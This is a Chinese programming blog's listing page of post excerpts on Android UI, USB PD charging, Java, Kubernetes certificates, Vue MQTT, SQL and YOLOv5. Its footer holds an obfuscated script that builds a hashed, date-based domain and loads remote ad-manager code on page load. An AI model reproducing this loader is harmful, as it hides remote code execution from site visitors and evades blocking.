除了CorelDRAW主程序，CorelDRAW 2023还提供了其他附加应用程序，如Corel PHOTO-PAINT（用于图像编辑和修饰）和Corel Font Manager（用于字体管理）等。这些应用程序相互配合，提供了更全面的设计工具和功能。
总的来说，CorelDRAW 2023是一款功能强大、全面而灵活的矢量图形设计软件。它为设计师和创意专业人士提供了丰富的工具和功能，帮助他们创造出令人印象深刻的视觉设计作品。无论是在印刷品、数字媒体还是在线内容方面，CorelDRAW 2022都是一个强大的工具，可满足各种设计需求。
CorelDRAW 2023 v24.5.0.731(矢量图形设计工具)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81c430496ee67d1d49481dddba76c8e4/" rel="bookmark">
			Android 控件背景实现发光效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主要实现的那种光晕效果：中间亮，四周逐渐变淡的。
这边有三种发光效果，先上效果图。
第一种、圆形发光体 实现代码：新建shape_light.xml，导入以下代码。使用时，直接给view设置为background。
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="oval"&gt; &lt;gradient android:centerColor="@color/transparent" android:centerX="0.5" android:centerY="0.5" android:gradientRadius="180dp" android:startColor="@color/yellow" android:type="radial" /&gt; &lt;/shape&gt; 第二种、矩形发光体 代码实现：通过自定义view实现。
package com.fht.testproject import android.annotation.SuppressLint import android.content.Context import android.graphics.Canvas import android.graphics.Color import android.graphics.Paint import android.graphics.RectF import android.util.AttributeSet import android.view.View /** * @author fenghaitao * @time 2023/11/1 16:40 */ class RectLightView @JvmOverloads constructor( context: Context, attributeSet: AttributeSet, defStyleAttr: Int = 0 ) : View(context, attributeSet, defStyleAttr) { private val paint: Paint = Paint() private val corner = 50f private val count = 200 init { paint.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81c430496ee67d1d49481dddba76c8e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c215685a3838f1cfac254a95f002b6eb/" rel="bookmark">
			USB PD v1.0快速充电通信原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 原理
本篇文章讲的快速充电是指USB论坛所发布的USB Power Delivery快速充电规范（通过VBUS直流电平上耦合FSK信号来请求充电器调整输出电压和电流的过程），不同于本人发布的另一篇文章所讲的高通Quick Charger 2.0规范，因为高通QC2.0是利用D+和D-上的不同的直流电压来请求充电器动态调整输出电压和电流实现快速充电的过程。
USB PD v1.0的通信是将协议层的消息调制成24MHZ的FSK信号并耦合到VBUS上或者从VBUS上获得FSK信号来实现手机和充电器通信的过程。
如图所示，在USB PD通信中，是将24MHz的FSK通过cAC-Coupling耦合电容耦合到VBUS上的直流电平上的，而为了使24MHz的FSK不对Power Supply或者USB Host的VBUS直流电压产生影响，在回路中同时添加了zIsolation电感组成的低通滤波器过滤掉FSK信号。 USB PD的原理，以手机和充电器都支持USB PD为例讲解如下：
1) USB OTG的PHY监控VBUS电压，如果有VBUS的5V电压存在并且检测到OTG ID脚是1K下拉电阻（不是OTG Host模式，OTG Host模式的ID电阻是小于1K的），就说明该电缆是支持USB PD的；
2) USB OTG做正常BC1.2规范的充电器探测并且启动USB PD 设备策略管理器，策略管理器监控VBUS的直流电平上是否耦合了FSK信号，并且解码消息得出是CapabilitiesSource 消息，就根据USB PD规范解析该消息得出USB PD充电器所支持的所有电压和电流列表对；
3) 手机根据用户的配置从CapabilitiesSource消息中选择一个电压和电流对，并将电压和电流对加在Request消息的payload上，然后策略管理器将FSK信号耦合到VBUS直流电平上；
4) 充电器解码FSK信号并发出Accept消息给手机，同时调整Power Supply的直流电压和电流输出；
5) 手机收到Accept消息，调整Charger IC的充电电压和电流；
6) 手机在充电过程中可以动态发送Request消息来请求充电器改变输出电压和电流，从而实现快速充电的过程。
目前2014年有好几家芯片厂商做出了USB PD v1.0芯片，下举例：
uPD720250 瑞萨
UPD100X microchip
2 Abbreviations
ARC：Argonant RISC Core
AT91SAM9260：SAM means Smart ARM-based Microcontroller
ATMEL SAMBA：ATMEL Smart ARM-based Microcontroller Boot Assistant
CC2530：TI ChipCon2530
DWC2：Design Ware Controller 2，Apple的嵌入式设备，包括iPad和iPhone都是使用的DWC2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c215685a3838f1cfac254a95f002b6eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/588c751077c37cfecfe810f74aefa9d5/" rel="bookmark">
			Java将List中的元素分批次处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 假设这是原始的 List&lt;String&gt; 集合 List&lt;String&gt; list = new ArrayList&lt;&gt;(); // 分批处理，每次取500个元素 int batchSize = 500; for (int i = 0; i &lt; list.size(); i += batchSize) { int endIndex = Math.min(i + batchSize, list.size()); List&lt;String&gt; batch = list.subList(i, endIndex); // 在这里进行对每个批次的处理 // 处理 batch 集合 } 此方法即可实现对list的集合分批次，代码中是分了500一次，比如此方法可以用于数据库批量操作时。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19939483c5c8032b6a1918ad7142539e/" rel="bookmark">
			kubernetes certs update 【证书更新】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 预备条件1.1 kubelet是否支持证书自动轮换1.2 查看集群指定证书位置1.3 查看证书是否过期2. 证书过期临近更新操作2.1 备份证书2.2 更新证书2.3 重启平台组件 3. 证书过期更新操作3.1 备份证书3.2 更新证书3.3 重启平台组件3.4 更新 config3.5 更新库表 1. 预备条件 1.1 kubelet是否支持证书自动轮换 查看 kubelet是否支持证书自动轮换，默认轮换的证书位于目录 /var/lib/kubelet/pki
[root@kube-master01 ~]# systemctl status kubelet ● kubelet.service - kubelet: The Kubernetes Node Agent Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled) Drop-In: /usr/lib/systemd/system/kubelet.service.d └─10-kubeadm.conf Active: active (running) since Tue 2023-07-25 14:57:05 CST; 18min ago Docs: https://kubernetes.io/docs/ Main PID: 2983 (kubelet) Tasks: 13 (limit: 49016) Memory: 55.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19939483c5c8032b6a1918ad7142539e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb75f942cbabf928b3fb5d9852ce7090/" rel="bookmark">
			Vue3 如何搭建mqtt及使用以及多个订阅获取数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用前先下载相应的依赖包
npm install mqtt -S
一、单个订阅方式
1、在utils里面创建mqtt.js
import * as mqtt from "mqtt/dist/mqtt.min"; import { mqttUrl } from "../config/env" class MQTT { url = '';// mqtt地址 topic = ''; //订阅地址 client =''; constructor(topic) { this.topic = topic; // 虽然是mqtt但是在客户端这里必须采用websock的链接方式 this.url = mqttUrl; } //初始化mqtt init() { const options = { clean: true, connectTimeout: 4000, // 超时时间 }; this.client = mqtt.connect(this.url, options); this.client.on('error', (error) =&gt; { console.log(error); }); this.client.on('reconnect', (error) =&gt; { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb75f942cbabf928b3fb5d9852ce7090/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab4a7b28e4541b2b1ff936c7ff6d3fe0/" rel="bookmark">
			时间戳转换成年月日时分秒（补0）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		function change(val) { let date = new Date(val); //时间戳转日期 let Y = date.getFullYear() + '-'; let M = (date.getMonth()+1 &lt; 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-'; let D = date.getDate()&lt;10? '0'+ date.getDate()+' ': date.getDate()+' '; let h = date.getHours()&lt;10?'0'+ date.getHours()+':':date.getHours()+':'; let m = date.getMinutes()&lt;10?'0'+date.getMinutes() + ':':date.getMinutes() + ':'; let s = date.getSeconds()&lt;10?'0'+ date.getSeconds():date.getSeconds(); return Y + M + D + h + m + s } 使用：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/293b45ce35d79bf83162c8b07e9207a7/" rel="bookmark">
			常用sql语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/*表操作*/
drop table order;
create table products(
product_no integer primary key default 1,
name text,
price numeric default 9.99
);
create table orders (
order_id integer primary key default 1,
product_no int,
quantity integer
);
create table order_items(
product_no int references products(product_no) on update set default 9,
order_id int references orders(order_id) on update set default 9,
quantity int,
primary key(product_no,order_id)
);
insert into products values(2,'aaa',10.00),(3,'bbb',18.00);
insert into orders values(2,2,50),(3,3,80);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/293b45ce35d79bf83162c8b07e9207a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1aaf6a86689fe2d23354b7d38bff20ff/" rel="bookmark">
			基于Stemblock&#43;shufflenet改进YOLOv5的垃圾分类检测系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.研究背景与意义 项目参考AAAI Association for the Advancement of Artificial Intelligence
研究背景与意义
垃圾分类是一项重要的环保任务，旨在减少垃圾对环境的污染和资源的浪费。随着城市化进程的加快和人口的增长，垃圾问题日益突出，传统的垃圾分类方式已经无法满足需求。因此，开发一种高效准确的垃圾分类检测系统具有重要的现实意义。
近年来，深度学习技术在计算机视觉领域取得了巨大的突破，特别是目标检测算法的发展。其中，YOLO（You Only Look Once）是一种快速且准确的目标检测算法，已经被广泛应用于各种场景。然而，传统的YOLO算法在垃圾分类任务中存在一些问题，如对小尺寸垃圾的检测效果较差，对于垃圾类别的识别准确率有待提高等。
为了解决这些问题，本研究将基于Stemblock和Shufflenet的改进方法应用于YOLOv5算法，以提高垃圾分类检测系统的性能。Stemblock是一种用于加速卷积神经网络的模块，通过优化网络的初始部分，可以提高网络的特征提取能力和计算效率。Shufflenet是一种轻量级的卷积神经网络结构，可以在保持较高准确率的同时，大幅减少网络的参数量和计算量。
本研究的主要目标是设计一种高效准确的垃圾分类检测系统，以实现自动化的垃圾分类。具体来说，本研究将通过以下几个方面的工作来达到目标：
首先，通过引入Stemblock模块，优化YOLOv5的初始部分，提高网络的特征提取能力和计算效率。Stemblock模块可以有效地减少网络的冗余计算，提高特征图的质量和多样性。
其次，结合Shufflenet的轻量级结构，进一步减少网络的参数量和计算量，提高垃圾分类检测系统的实时性和效率。Shufflenet通过引入逐通道的分组卷积和通道重排操作，可以在保持较高准确率的同时，大幅减少网络的计算复杂度。
最后，通过大量的实验验证和对比分析，评估改进后的YOLOv5算法在垃圾分类任务中的性能表现。本研究将使用公开的垃圾分类数据集进行训练和测试，比较改进后的算法与传统的YOLOv5算法在准确率、召回率和速度等方面的差异。
本研究的意义在于提出了一种基于Stemblock和Shufflenet改进的YOLOv5算法，用于垃圾分类检测系统。该算法具有较高的准确率和实时性，可以有效地应用于实际的垃圾分类场景中。通过自动化的垃圾分类，可以减少人工分类的工作量，提高垃圾分类的效率和准确性，从而为环境保护和资源回收做出贡献。此外，本研究还为深度学习在目标检测领域的应用提供了一种新的思路和方法，对相关研究具有一定的参考价值。
2.图片演示 3.视频演示 基于Stemblock+shufflenet改进YOLOv5的垃圾分类检测系统
4.数据集的采集＆标注和整理 图片的收集 首先，我们需要收集所需的图片。这可以通过不同的方式来实现，例如使用现有的数据集、
使用labelImg进行标注 labelImg是一个图形化的图像注释工具，支持VOC和YOLO格式。以下是使用labelImg将图片标注为VOC格式的步骤：
（1）下载并安装labelImg。
（2）打开labelImg并选择“Open Dir”来选择你的图片目录。
（3）为你的目标对象设置标签名称。
（4）在图片上绘制矩形框，选择对应的标签。
（5）保存标注信息，这将在图片目录下生成一个与图片同名的XML文件。
（6）重复此过程，直到所有的图片都标注完毕。
转换为YOLO格式 由于YOLO使用的是txt格式的标注，我们需要将VOC格式转换为YOLO格式。可以使用各种转换工具或脚本来实现。
下面是一个简单的方法是使用Python脚本，该脚本读取XML文件，然后将其转换为YOLO所需的txt格式。
#!/usr/bin/env python3 # -*- coding: utf-8 -*- import xml.etree.ElementTree as ET import os classes = [] # 初始化为空列表 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__)) def convert(size, box): dw = 1. / size[0] dh = 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1aaf6a86689fe2d23354b7d38bff20ff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29804619a6c2e6f86170887fc2e25c28/" rel="bookmark">
			JS功能实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 轮播图移动端轮播图按下回车发表评论tab栏切换全选按钮 轮播图 &lt;style&gt; * { box-sizing: border-box; } .slider { width: 560px; height: 400px; overflow: hidden; } .slider-wrapper { width: 100%; height: 320px; } .slider-wrapper img { width: 100%; height: 100%; display: block; } .slider-footer { height: 80px; background-color: rgb(100, 67, 68); padding: 12px 12px 0 12px; position: relative; } .slider-footer .toggle { position: absolute; right: 0; top: 12px; display: flex; } .slider-footer .toggle button { margin-right: 12px; width: 28px; height: 28px; appearance: none; border: none; background: rgba(255, 255, 255, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29804619a6c2e6f86170887fc2e25c28/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/38/">«</a>
	<span class="pagination__item pagination__item--current">39/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/40/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>